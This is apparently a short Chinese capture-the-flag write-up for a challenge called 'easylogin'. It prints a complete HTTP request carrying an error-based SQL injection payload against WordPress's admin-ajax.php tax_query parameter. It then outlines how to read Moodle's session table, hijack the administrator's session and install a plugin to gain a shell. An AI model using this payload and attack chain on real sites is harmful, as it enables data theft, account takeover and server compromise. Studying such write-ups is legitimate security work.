---
tags: [SQL注入, WordPress, Moodle, Session劫持, 插件Getshell]
---

# easylogin

80: wordpress

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 47.105.60.229
Content-Length: 183
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://47.105.60.229
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/103.0.0.0 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://47.105.60.229/wp-login.php?redirect_to=http%3A%2F%2F47.105.60.229%2Fwp-
admin%2F&reauth=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Connection: close


action=aa&query_vars[tax_query][1][include_children]=1&query_vars[tax_query][1][terms]
[1]=1) or updatexml(0x7e,concat(1,user()),0x7e)#&query_vars[tax_query][1]
[field]=term_taxonomy_id
```

读moodle的mdl_sessions，然后找userid=2的session

替换登陆后台，然后安装插件getshell即可。